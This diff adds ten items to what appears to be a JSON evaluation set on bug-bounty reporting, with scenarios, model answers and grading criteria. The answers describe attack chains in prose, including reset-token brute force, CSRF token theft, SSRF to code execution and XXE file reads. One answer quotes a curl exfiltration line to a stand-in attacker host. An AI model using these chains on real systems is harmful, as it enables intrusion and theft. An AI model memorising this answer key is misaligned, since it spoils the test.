@@ -1208,5 +1208,135 @@
       "Quantifies attack speed/feasibility and downstream impact as differentiation signals"
     ],
     "category": "bounty_patterns"
+  },
+  {
+    "id": 131,
+    "scenario": "An authentication cookie set with SameSite=None and Secure flags allows account takeover via cross-site request forgery on the login endpoint. The CVSS base is 6.5 (medium), but the program classifies it P1 because financial transactions occur without additional confirmation.",
+    "prompt": "How should you frame this finding to align CVSS calculation with program severity expectations?",
+    "expected_answer": "CVSS often underweights business context. Here, the base score of 6.5 reflects technical attack complexity, but the true impact is P1 because: (1) cookie theft enables full account access without re-authentication, (2) financial transactions execute immediately post-login without additional MFA/confirmation step, (3) attacker can chain this to drain balances or alter payment methods. Reframe the finding as 'Authentication Bypass (SameSite Bypass) with Unprotected Financial Transaction Workflow.' Highlight that an attacker needs only to trick a logged-in user into visiting a malicious site\u2014no social engineering of credentials required. Include PoC showing unauthorized transaction execution post-exploit. On HackerOne, this typically bounces to P1 despite CVSS 6.5 because they weight authentication + financial impact heavily. On Bugcrowd, may require explicit business impact narrative. On Intigriti, emphasize the low attacker skill requirement (CVSS factor often overlooked).",
+    "reasoning_requirement": "Recognize the gap between technical CVSS and program severity; reframe findings around business impact and exploitation ease.",
+    "evaluation_criteria": [
+      "Explains why CVSS 6.5 is misaligned with P1 classification",
+      "Identifies the critical workflow unprotected by additional confirmation",
+      "Tailors narrative to platform-specific severity weights (HackerOne vs Bugcrowd vs Intigriti)"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 132,
+    "scenario": "A password reset endpoint enforces a 5-attempt rate limit per email, but the limit resets if you change the email parameter in the POST body. An attacker can brute-force 6-digit reset tokens by cycling through email variations (user+1@, user+2@, etc.), each granting 5 free attempts.",
+    "prompt": "What is the true severity and reproduction complexity, and how do you avoid duplicate rejections?",
+    "expected_answer": "This is a P2 account takeover (not P1, because it requires knowledge of the target email and internet access to that email/associated accounts). Severity hinges on reproduction chain clarity: (1) attacker obtains target email address, (2) begins brute-force with first five attempts on victim@example.com, (3) submits reset-token request via attacker+1@example.com to bypass rate limit, (4) repeats with attacker+2@, attacker+3@, etc., cycling through email aliases, (5) once token is guessed, attacker accesses password reset page directly. Avoid duplicates by emphasizing the rate-limit bypass mechanism (email parameter manipulation) as distinct from a generic 'weak token' finding\u2014programs often reject duplicate 'weak tokens' but accept this because it's a logic flaw. Include a working PoC showing 3+ successful token guesses across different email variants in under 60 seconds. Quantify the search space reduction (from millions to thousands of requests). On Bugcrowd, this pays well because it demonstrates process bypass; on HackerOne, emphasize the authentication boundary violation.",
+    "reasoning_requirement": "Analyze reproduction chain complexity and identify unique bypass logic to prevent duplicate classification.",
+    "evaluation_criteria": [
+      "Clearly maps the email parameter cycling as distinct from weak tokens",
+      "Provides exact reproduction steps showing search space reduction",
+      "Explains why this avoids typical 'duplicate: weak token' rejections"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 133,
+    "scenario": "An admin endpoint at /admin/users/{id}/role allows role assignment. The API checks if the requester is an admin, but ID values are predictable integers. A support agent (non-admin) can enumerate user IDs and the endpoint silently fails without auditing. In-scope documentation states 'admin endpoints only,' but does not explicitly exclude privilege escalation attempts.",
+    "prompt": "Is this in-scope, and how do you disambiguate it from over-scoping?",
+    "expected_answer": "This is a P3 finding with scope ambiguity risk. The vulnerability (IDOR + insufficient role validation) is clear, but the *reporting boundary* is fuzzy: (1) the endpoint exists, (2) it rejects the request (good), but (3) it silently fails without logging, creating an information disclosure risk. The scope document says 'admin endpoints only'\u2014does that mean 'do not report admin endpoints' or 'only report if admin-privileged endpoints are vulnerable'? Clarify by: first, checking if the program explicitly lists IDOR as in-scope (most do), second, verifying that the silent failure does not leak information (e.g., does error message differ between 'invalid ID' and 'insufficient privileges'?), third, consulting the program's past reports to see if similar IDOR findings were accepted. If you find that other IDOR findings were accepted for non-admin users, this is clearly in-scope. Frame it as 'Insufficient Access Control on Sensitive Endpoint' rather than 'IDOR'\u2014it emphasizes the role-check failure over the ID enumeration. Include proof that the endpoint handles non-admin requests without audit logging, which is the novel aspect.",
+    "reasoning_requirement": "Disambiguate scope ambiguity by examining program history and endpoint behavior.",
+    "evaluation_criteria": [
+      "Identifies the specific scope clause causing ambiguity",
+      "Shows how to resolve it via program history and endpoint behavior analysis",
+      "Frames finding to emphasize novel aspect (audit gap) over generic IDOR"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 134,
+    "scenario": "A web application implements CSRF tokens, but they are tied to the user's session cookie rather than a per-request state. An attacker can obtain a victim's valid CSRF token via reflected XSS or GitHub metadata leaks, then use it repeatedly across multiple requests until the session expires.",
+    "prompt": "How does this differ from no CSRF protection, and why do HackerOne and Bugcrowd classify it differently?",
+    "expected_answer": "This is not true CSRF protection\u2014it's a 'session-scoped token' that removes the stateless validation property CSRF tokens require. Severity is P2-P3 depending on platform philosophy. HackerOne tends to rate this as P3 or P2 with justification that the attacker still needs to exfiltrate the token (increases complexity), but acknowledges it is vulnerable. Bugcrowd often rates this as P2 outright because the fixed session lifetime provides some implicit expiration boundary. Intigriti may ask for specific attack scenarios (token exfiltration vector + exploitation chain) before classifying. The true risk: if an attacker can extract the token via XSS, HTTP logs, or browser history, they can chain attacks across multiple endpoints until token refresh. Demonstrate: (1) XSS to steal the CSRF token from the DOM or page source, (2) use stolen token on a state-changing endpoint (e.g., email change, password reset), (3) repeat on another endpoint without token refresh. Key distinction: claim is 'Reusable CSRF Tokens' not 'Missing CSRF Protection'\u2014this acknowledges the defense exists but is misconfigured. On HackerOne, expected_answer should emphasize the token extraction method; on Bugcrowd, focus on the multi-request reusability window.",
+    "reasoning_requirement": "Distinguish misconfigured CSRF protection from missing CSRF protection and tailor severity to platform norms.",
+    "evaluation_criteria": [
+      "Explains why session-scoped tokens fail CSRF protection principles",
+      "Provides explicit PoC showing token reusability across multiple requests",
+      "Maps platform-specific severity divergence (HackerOne P3 vs Bugcrowd P2)"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 135,
+    "scenario": "An API client-side JavaScript file contains a hardcoded read-only API key. The same key is used across three endpoints: /api/user-profile (public data), /api/notifications (private messages), /api/payment-history (financial records). No rate limiting is enforced.",
+    "prompt": "Is this one finding or three, and how do you maximize payout while avoiding duplicate rejection?",
+    "expected_answer": "This is one root-cause finding with three distinct impact vectors, but must be reported strategically to avoid duplicate rejection. Root cause: hardcoded API key in client-side code (P2). Report as a single finding titled 'API Credential Exposure via Client-Side JavaScript' with evidence that the same key grants access to three distinct data classes. Impact: the three endpoints represent severity amplification\u2014not duplication. Explain the kill chain: (1) extract API key from minified JavaScript via browser DevTools or source map, (2) use key to enumerate user IDs via /api/user-profile, (3) query /api/notifications to access private messages, (4) pull financial records via /api/payment-history without rate limiting, enabling large-scale data scraping. The payout scales based on which endpoint leaks the most sensitive data\u2014typically P2 (~$500\u2013$2k on Bugcrowd), but can elevate to P1 if payment-history is included and no authentication layer exists. On HackerOne, emphasize the multi-API risk; on Intigriti, highlight the lack of rate limiting as an amplification vector. Avoid submitting three separate reports (one per endpoint)\u2014programs auto-reject these as duplicates because they share the root cause.",
+    "reasoning_requirement": "Recognize multi-vector exploitation from a single credential and structure reporting to maximize payout while preventing duplicate rejection.",
+    "evaluation_criteria": [
+      "Identifies root cause (client-side credential) vs. impact vectors (three endpoints)",
+      "Constructs complete kill chain showing data exfiltration at scale",
+      "Explains why reporting as one finding beats three and tailors to platform policy"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 136,
+    "scenario": "A webhook configuration endpoint allows admins to set a callback URL for order events. The webhook is called server-side without validating that the URL is not internal (e.g., http://localhost:8080, http://internal-admin:8000). No request filtering blocks access to private networks.",
+    "prompt": "What is the SSRF chain, and how do you amplify it to P1?",
+    "expected_answer": "This is a Server-Side Request Forgery (SSRF) vulnerability enabling internal network reconnaissance and potential service exploitation. Base severity is P2, but amplifies to P1 if chained with service enumeration or injection. Kill chain: (1) set webhook URL to http://localhost:8080 (internal admin panel), (2) trigger an order event, (3) server makes request to internal address, (4) response is logged or returned to attacker via webhook response metadata, (5) repeat with different ports/services to enumerate internal infrastructure (e.g., http://internal-db:5432, http://redis-cache:6379). Amplification to P1: (1) identify an internal service running on an enumerated port (e.g., Jenkins CI), (2) exploit SSRF to make authenticated requests to that service (Jenkins typically allows local requests without auth), (3) trigger a build pipeline or execute code, (4) gain shell access to the server. Avoid duplicate rejection by emphasizing the webhook configuration logic flaw, not generic SSRF\u2014focus on how the application fails to validate internal URLs before webhook dispatch. On HackerOne, this is typically P1 if RCE is demonstrated; on Bugcrowd, P2-P1 depending on evidence of internal service exploitation. Include proof-of-concept: webhook request followed by server initiating request to localhost, with response captured.",
+    "reasoning_requirement": "Construct a multi-stage SSRF chain leveraging webhook configuration to reach internal services and demonstrate RCE potential.",
+    "evaluation_criteria": [
+      "Maps SSRF to internal service enumeration with explicit port/service examples",
+      "Constructs amplification chain from reconnaissance to RCE",
+      "Provides PoC showing webhook triggering internal request and response capture"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 137,
+    "scenario": "An error page displays full exception stack traces including file paths, database query snippets, and variable values when a user-controlled input causes a processing error. The information is not sensitive per CVSS (no credentials), but reveals internal application structure.",
+    "prompt": "Why is this P3-P4 despite low technical severity, and how do you quantify payout divergence?",
+    "expected_answer": "Information Disclosure (stack trace leakage) is typically P4-P3 under CVSS because it does not directly enable exploitation\u2014no credentials, no auth bypass, no data access. However, bug bounty programs often classify it P3 or even P2 in certain contexts because it enables reconnaissance for larger attacks. Payout divergence: on HackerOne, this is usually P4 ($100\u2013$250) unless you can chain it to a known vulnerability (e.g., use stack trace to identify a version with a known CVE, then exploit it\u2014this becomes P2-P3). On Bugcrowd, similar pricing unless the error page is on a high-value endpoint (e.g., /api/payment-processing, /admin/). On Intigriti, may treat as P3 if the stack trace reveals internal architecture that could be weaponized (e.g., specific ORM framework version, database type, library versions). Quantify by: (1) identifying the exposed information (file paths, function names, library versions), (2) mapping those to public exploits via Exploit-DB, (3) showing how this accelerates an attacker's reconnaissance phase. Frame as 'Verbose Error Handling Enabling Reconnaissance' rather than generic 'Information Disclosure.' Include screenshot of the stack trace with sensitive details highlighted. If you can map the disclosed version to a known CVE, emphasize that\u2014this bridges from P4 to P2-P3.",
+    "reasoning_requirement": "Articulate why low-severity information disclosure carries program-specific payout divergence based on exploitation potential.",
+    "evaluation_criteria": [
+      "Maps disclosed information (versions, paths, library names) to reconnaissance value",
+      "Shows payout variance across platforms (HackerOne P4 vs. Bugcrowd P3)",
+      "Optionally chains to known CVE to elevate severity"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 138,
+    "scenario": "A file upload endpoint accepts XML files for processing. The application parses XML without disabling external entity resolution. However, the server blocks outbound HTTP requests via firewall, making traditional XXE exfiltration impossible. The XXE can only read local files.",
+    "prompt": "Why is this XXE difficult to monetize, and what reproduction complexity justifies P2 instead of P3?",
+    "expected_answer": "XXE (XML External Entity Injection) is typically P1-P2 if it enables RCE or data exfiltration, but P3-P4 if limited to local file read with firewall blocking outbound traffic. The challenge: traditional XXE exfiltration (curl http://attacker.com?data=) fails due to firewall. Monetization path: (1) use XXE to read /etc/passwd or /app/config.properties to enumerate local files, (2) read application configuration to find database credentials or API keys, (3) use those credentials to access databases or external APIs. Reproduction complexity justifies P2: (1) craft malicious XML with DOCTYPE declaration, (2) upload file to endpoint, (3) parse response or error messages for file contents, (4) repeat with different local file paths to enumerate sensitive configurations. The complexity is three-step (reconnaissance \u2192 credential extraction \u2192 lateral movement), which most programs treat as P2. Avoid duplicate rejection by emphasizing the 'blind XXE via local file read' angle\u2014many programs see XXE and assume network exfiltration is possible, but you're demonstrating a constrained environment where local reads are the only vector. Include exact file paths you can read (/app/config.yml, /proc/self/environ) and the impact of those reads (credentials, secrets). On HackerOne, this may stay P3 without clear credential extraction; on Bugcrowd, P2 if credentials are successfully exfiltrated.",
+    "reasoning_requirement": "Recognize constrained XXE (firewall blocking exfiltration) and construct credential-extraction chains to justify P2 classification.",
+    "evaluation_criteria": [
+      "Identifies the firewall constraint and explains why traditional XXE exfiltration fails",
+      "Maps local file read to credential extraction and lateral movement impact",
+      "Provides PoC showing XXE parsing and sensitive file disclosure"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 139,
+    "scenario": "A payment processing application allows IDOR access to transaction records via /api/transactions/{id}. An attacker can enumerate transaction IDs across multiple customers and retrieve amounts, merchant details, and timestamps. However, the transaction amount and merchant are visible in the user's own transaction history\u2014only the cross-customer view is unauthorized.",
+    "prompt": "Is this a valid finding or a duplicate of existing transaction visibility, and what's the reporting strategy?",
+    "expected_answer": "This is a valid P2-P1 IDOR finding, not a duplicate of transaction visibility, because the unauthorized access crosses the customer boundary. The distinction: a user seeing their own transaction history is expected, but querying transaction IDs across the entire customer database and retrieving others' financial records is a severe breach. Reporting strategy: frame as 'Unauthorized Cross-Customer Financial Data Access via IDOR' to emphasize the scope expansion, not generic 'transaction visibility.' Include evidence that: (1) the endpoint requires no customer-context validation, (2) transaction IDs are sequential or easily enumerable, (3) the attacker can retrieve a large sample of transactions from multiple customers (e.g., 100+ transactions from 20+ customers) in under 60 seconds. Quantify the impact: a single attacker can profile the entire customer base's spending patterns, detect fraud, identify high-value customers, and infer business revenue. On HackerOne, this is typically P1 ($5k\u2013$20k+) because it affects customer financial data at scale. On Bugcrowd, P1-P2 depending on customer sensitivity. Avoid duplicate rejection by clarifying that this is not 'users can see their own transactions' but rather 'users can see all transactions in the system.' Include PoC showing enumeration of 50+ transaction IDs and retrieval of cross-customer data within seconds.",
+    "reasoning_requirement": "Disambiguate IDOR from expected data visibility by emphasizing cross-boundary unauthorized access.",
+    "evaluation_criteria": [
+      "Clearly states the expected boundary (own transactions only) and the breach (all customer transactions)",
+      "Provides enumeration PoC showing scale and speed of cross-customer data retrieval",
+      "Maps to P1 classification on financial/PII impact across customer base"
+    ],
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 140,
+    "scenario": "A web application redirects users after login to a user-controlled 'next' parameter: redirect(request.query.next). The redirect is to an external URL, enabling phishing. However, the application is a public information portal with no sensitive user data, and users rarely click 'next' after login because it's not prominently displayed.",
+    "prompt": "How do you quantify the payout impact of Open Redirect with low user interaction, and should you submit it?",
+    "expected_answer": "Open Redirect is P4-P3 in a low-risk context (public data, low interaction). Payout divergence: on HackerOne, typically P4 ($100\u2013$300) unless you can demonstrate a phishing chain where the redirect is prominently placed or users are explicitly prompted to click a 'continue' button. On Bugcrowd, P3-P4 depending on the application's sensitivity. On Intigriti, may ask for a complete phishing scenario with email template before classifying. Decision to submit: yes, but only if you can amplify it. Amplification paths: (1) find where the 'next' parameter is generated by the application (e.g., login forms, password-reset emails) and show that users are *directed* to click it, (2) combine with other findings (e.g., if combined with an Account Enumeration vulnerability, you can phish users you've enumerated), (3) show that the redirect URL is placed in confirmation emails or SMS messages, increasing click-through rates. If the 'next' parameter exists only in source code or is never surfaced to users, do not submit\u2014it will be rejected as 'not exploitable' or 'no user interaction.' Reporting strategy: include a complete phishing email or SMS template showing the redirect in context, plus evidence that users are likely to click it (e.g., screenshot of the login form with the 'next' button or link). Frame as 'Phishing-Enabling Open Redirect' if you can show user-facing placement; otherwise, skip this finding.",
+    "reasoning_requirement": "Evaluate Open Redirect exploitability based on user interaction likelihood and amplification potential before deciding to submit.",
+    "evaluation_criteria": [
+      "Identifies the user-interaction gap and explains why low-interaction redirects pay less",
+      "Constructs phishing amplification (e.g., email context, placement in user flows)",
+      "Provides decision framework for submission based on likelihood of user click-through"
+    ],
+    "category": "bounty_patterns"
   }
 ]
